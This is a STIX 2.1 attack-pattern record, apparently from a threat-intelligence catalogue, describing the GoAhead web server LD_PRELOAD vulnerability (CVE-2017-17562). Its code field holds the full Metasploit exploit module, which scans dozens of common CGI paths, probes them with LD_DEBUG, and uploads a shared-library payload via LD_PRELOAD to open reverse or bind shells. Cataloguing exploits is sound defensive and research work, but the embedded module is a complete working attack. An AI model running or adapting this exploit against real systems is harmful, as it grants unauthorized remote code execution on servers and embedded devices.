{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--21e31ee2-a112-49c8-bc4b-36411b0d6a0c",
    "created": "2024-08-14T17:01:45.05275Z",
    "modified": "2024-08-14T17:01:45.052754Z",
    "name": "GoAhead Web Server LD_PRELOAD Arbitrary Module Load",
    "description": " This module triggers an arbitrary shared library load vulnerability in GoAhead web server versions between 2.5 and that have the CGI module enabled. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/goahead_ldpreload.rb",
            "external_id": "goahead_ldpreload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-17562"
        },
        {
            "source_name": "reference",
            "url": "https://www.elttam.com.au/blog/goahead/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'GoAhead Web Server LD_PRELOAD Arbitrary Module Load',\n      'Description'    => %q{\n          This module triggers an arbitrary shared library load vulnerability\n        in GoAhead web server versions between 2.5 and that have the CGI module\n        enabled.\n      },\n      'Author'         =>\n        [\n          'Daniel Hodson <daniel[at]elttam.com.au>', # Elttam Vulnerability Discovery & Python Exploit\n          'h00die',                                  # Metasploit Module\n          'hdm',                                     # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-17562' ],\n          [ 'URL', 'https://www.elttam.com.au/blog/goahead/' ]\n        ],\n      'Payload'         =>\n        {\n          'Space'       => 5000,\n          'DisableNops' => true\n        },\n      'Platform'        => 'linux',\n      'Targets'         =>\n        [\n\n          [ 'Automatic (Reverse Shell)',\n            { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ], 'ReverseStub' => true,\n              'Payload' => {\n                'Compat' => {\n                  'PayloadType' => 'cmd_reverse_stub',\n                  'ConnectionType' => 'reverse',\n                }\n              }\n            }\n          ],\n\n          [ 'Automatic (Bind Shell)',\n            { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ], 'BindStub' => true,\n              'Payload' => {\n                'Compat' => {\n                  'PayloadType' => 'cmd_bind_stub',\n                  'ConnectionType' => 'bind'\n                }\n              }\n            }\n          ],\n\n          [ 'Automatic (Command)',\n            { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] }\n          ],\n          [ 'Linux x86',        { 'Arch' => ARCH_X86 } ],\n          [ 'Linux x86_64',     { 'Arch' => ARCH_X64 } ],\n          [ 'Linux ARM (LE)',   { 'Arch' => ARCH_ARMLE } ],\n          [ 'Linux ARM64',      { 'Arch' => ARCH_AARCH64 } ],\n          [ 'Linux MIPS',       { 'Arch' => ARCH_MIPS } ],\n          [ 'Linux MIPSLE',     { 'Arch' => ARCH_MIPSLE } ],\n          [ 'Linux MIPS64',     { 'Arch' => ARCH_MIPS64 } ],\n          [ 'Linux MIPS64LE',   { 'Arch' => ARCH_MIPS64LE } ],\n\n          # PowerPC stubs are currently over the 16384 maximum POST size\n          # [ 'Linux PPC',        { 'Arch' => ARCH_PPC } ],\n          # [ 'Linux PPC64',      { 'Arch' => ARCH_PPC64 } ],\n          # [ 'Linux PPC64 (LE)', { 'Arch' => ARCH_PPC64LE } ],\n\n          [ 'Linux SPARC',      { 'Arch' => ARCH_SPARC } ],\n          [ 'Linux SPARC64',    { 'Arch' => ARCH_SPARC64 } ],\n          [ 'Linux s390x',      { 'Arch' => ARCH_ZARCH } ],\n        ],\n      'DefaultOptions' =>\n        {\n          'SHELL'      => '/bin/sh',\n        },\n      'Privileged'      => false,\n      'DisclosureDate'  => '2017-12-18', # June 9th, technically, via github commit.\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptString.new('TARGET_URI', [false, 'The path to a CGI script on the GoAhead server'])\n      ])\n  end\n\n  # Setup our mapping of Metasploit architectures to gcc architectures\n  def setup\n    super\n    @@payload_arch_mappings = {\n        ARCH_X86      => [ 'x86' ],\n        ARCH_X64      => [ 'x86_64' ],\n        ARCH_MIPS     => [ 'mips' ],\n        ARCH_MIPSLE   => [ 'mipsel' ],\n        ARCH_MIPSBE   => [ 'mips' ],\n        ARCH_MIPS64   => [ 'mips64' ],\n        ARCH_MIPS64LE => [ 'mips64el' ],\n\n        # PowerPC stubs are currently over the 16384 maximum POST size\n        # ARCH_PPC      => [ 'powerpc' ],\n        # ARCH_PPC64    => [ 'powerpc64' ],\n        # ARCH_PPC64LE  => [ 'powerpc64le' ],\n\n        ARCH_SPARC    => [ 'sparc' ],\n        ARCH_SPARC64  => [ 'sparc64' ],\n        ARCH_ARMLE    => [ 'armel', 'armhf' ],\n        ARCH_AARCH64  => [ 'aarch64' ],\n        ARCH_ZARCH    => [ 's390x' ],\n    }\n\n    # Architectures we don't offically support but can shell anyways with interact\n    @@payload_arch_bonus = %W{\n      mips64el sparc64 s390x\n    }\n\n    # General platforms (OS + C library)\n    @@payload_platforms = %W{\n      linux-glibc\n    }\n  end\n\n  # Use fancy payload wrappers to make exploitation a joyously lazy exercise\n  def cycle_possible_payloads\n    template_base = ::File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2017-17562\")\n    template_list = []\n    template_type = nil\n    template_arch = nil\n\n    # Handle the generic command types first\n    if target.arch.include?(ARCH_CMD)\n\n      # Default to a system() template\n      template_type = 'system'\n\n      # Handle reverse_tcp() templates\n      if target['ReverseStub']\n        template_type = 'reverse'\n      end\n\n      # Handle reverse_tcp() templates\n      if target['BindStub']\n        template_type = 'bind'\n      end\n\n      all_architectures = @@payload_arch_mappings.values.flatten.uniq\n\n      # Prioritize the most common architectures first\n      %W{ x86_64 x86 armel armhf mips mipsel }.each do |t_arch|\n        template_list << all_architectures.delete(t_arch)\n      end\n\n      # Queue up the rest for later\n      all_architectures.each do |t_arch|\n        template_list << t_arch\n      end\n\n    # Handle the specific architecture targets next\n    else\n      template_type = 'shellcode'\n      target.arch.each do |t_name|\n        @@payload_arch_mappings[t_name].each do |t_arch|\n          template_list << t_arch\n        end\n      end\n    end\n\n    # Remove any duplicates that may have snuck in\n    template_list.uniq!\n\n    # Cycle through each top-level platform we know about\n    @@payload_platforms.each do |t_plat|\n\n      # Cycle through each template and yield\n      template_list.each do |t_arch|\n\n\n        wrapper_path = ::File.join(template_base, \"goahead-cgi-#{template_type}-#{t_plat}-#{t_arch}.so.gz\")\n        unless ::File.exist?(wrapper_path)\n          raise RuntimeError.new(\"Missing executable template at #{wrapper_path}\")\n        end\n\n        data = ''\n        ::File.open(wrapper_path, \"rb\") do |fd|\n          data = Rex::Text.ungzip(fd.read)\n        end\n\n        pidx = data.index('PAYLOAD')\n        if pidx\n          data[pidx, payload.encoded.length] = payload.encoded\n        end\n\n        if %W{reverse bind}.include?(template_type)\n          pidx = data.index(\"55555\")\n          if pidx\n            data[pidx, 5] = datastore['LPORT'].to_s.ljust(5)\n          end\n        end\n\n        if 'reverse' == template_type\n          pidx = data.index(\"000.000.000.000\")\n          if pidx\n            data[pidx, 15] = datastore['LHOST'].to_s.ljust(15)\n          end\n        end\n\n        vprint_status(\"Using payload wrapper 'goahead-cgi-#{template_type}-#{t_arch}'...\")\n        yield(data)\n\n        # Introduce a small delay for the payload to stage\n        Rex.sleep(0.50)\n\n        # Short-circuit once we have a session\n        return if session_created?\n      end\n    end\n  end\n\n  # Start the shell train\n  def exploit\n    # Find a valid CGI target\n    target_uri = find_target_cgi\n    return unless target_uri\n\n    # Create wrappers for each potential architecture\n    cycle_possible_payloads do |wrapped_payload|\n\n      # Trigger the vulnerability and run the payload\n      trigger_payload(target_uri, wrapped_payload)\n      return if session_created?\n    end\n  end\n\n  # Determine whether the target is exploitable\n  def check\n    # Find a valid CGI target\n    target_uri = find_target_cgi\n    unless target_uri\n      return Exploit::CheckCode::Unknown\n    end\n    return Exploit::CheckCode::Vulnerable\n  end\n\n  # Upload and LD_PRELOAD execute the shared library payload\n  def trigger_payload(target_uri, wrapped_payload)\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri),\n      'vars_get' => {\n        'LD_PRELOAD' => '/proc/self/fd/0'\n      },\n      'data' => wrapped_payload\n    })\n\n    nil\n  end\n\n  # Find an exploitable CGI endpoint. These paths were identified by mining Sonar HTTP datasets\n  def find_target_cgi\n\n    target_uris = []\n    common_dirs = %W^\n/\n/cgi-bin/\n/cgi/\n^\n    common_exts = [\"\", \".cgi\"]\n    common_cgis = %W^\nadmin\napply\nnon-CA-rev\ncheckCookie\ncheck_user\nchn/liveView\ncht/liveView\ncnswebserver\nconfig\nconfigure/set_link_neg\nconfigure/swports_adjust\neng/liveView\nfirmware\ngetCheckCode\nget_status\ngetmac\ngetparam\nguest/Login\nhome\nhtmlmgr\nindex\nindex/login\njscript\nkvm\nliveView\nlogin\nlogin.asp\nlogin/login\nlogin/login-page\nlogin_mgr\nluci\nmain\nmain-cgi\nmanage/login\nmenu\nmlogin\nnetbinary\nnobody/Captcha\nnobody/VerifyCode\nnormal_userLogin\notgw\npage\nrulectl\nservice\nset_new_config\nsl_webviewer\nssi\nstatus\nsysconf\nsystemutil\nt/out\ntop\nunauth\nupload\nvariable\nwanstatu\nwebcm\nwebmain\nwebproc\nwebscr\nwebviewLogin\nwebviewLogin_m64\nwebviewer\nwelcome\ncgitest\n^\n\n    if datastore['TARGET_URI'].to_s.length > 0\n      target_uris << datastore['TARGET_URI']\n    end\n\n    common_dirs.each do |cgi_dir|\n      common_cgis.each do |cgi_path|\n        common_exts.each do |cgi_ext|\n          target_uris << \"#{cgi_dir}#{cgi_path}#{cgi_ext}\"\n        end\n      end\n    end\n\n    print_status(\"Searching #{target_uris.length} paths for an exploitable CGI endpoint...\")\n\n    target_uris.each do |uri|\n      if is_cgi_exploitable?(uri)\n        print_good(\"Exploitable CGI located at #{uri}\")\n        return uri\n      end\n    end\n\n    print_error(\"No valid CGI endpoints identified\")\n    return\n  end\n\n  # Use the output of LD_DEBUG=help to determine whether an endpoint is exploitable\n  def is_cgi_exploitable?(uri)\n    res = send_request_cgi({'uri' => uri, 'method' => 'POST', 'vars_get' => { 'LD_DEBUG' => 'help' }})\n\n    if res\n      vprint_status(\"Request for #{uri} returned #{res.code}: #{res.message}\")\n    else\n      vprint_status(\"Request for #{uri} did not return a response\")\n    end\n\n    !!(res && res.body && res.body.to_s.include?(\"LD_DEBUG_OUTPUT\"))\n  end\n\n  # This sometimes determines if the CGI module is enabled, but doesn't seem\n  # to return the error to the client in newer versions. Unused for now.\n  def is_cgi_enabled?\n    return true\n    res = send_request_cgi({'uri' => \"/cgi-bin\"})\n    !!(res && res.body && res.body.to_s.include?(\"Missing CGI name\"))\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-12-18, # June 9th, technically, via github commit.",
    "x_mitre_platforms": [
        "linux'"
    ]
}